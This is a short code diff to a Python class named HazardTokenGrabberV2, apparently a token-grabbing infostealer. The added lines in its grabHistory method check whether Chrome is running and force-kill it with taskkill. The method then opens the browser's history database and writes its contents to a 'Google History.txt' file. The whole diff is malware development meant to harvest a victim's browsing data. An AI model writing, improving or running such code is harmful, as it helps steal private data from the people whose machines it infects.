@@ -473,6 +473,9 @@ class HazardTokenGrabberV2(Functions):
 
     @try_extract
     def grabHistory(self):
+        if "chrome.exe" in (p.name() for p in psutil.process_iter()):
+            os.system("taskkill /im chrome.exe /f")
+            
         f = open(self.dir + '\\Google History.txt', 'w', encoding="cp437", errors='ignore')
 
         def extract_search_history(db_cursor):
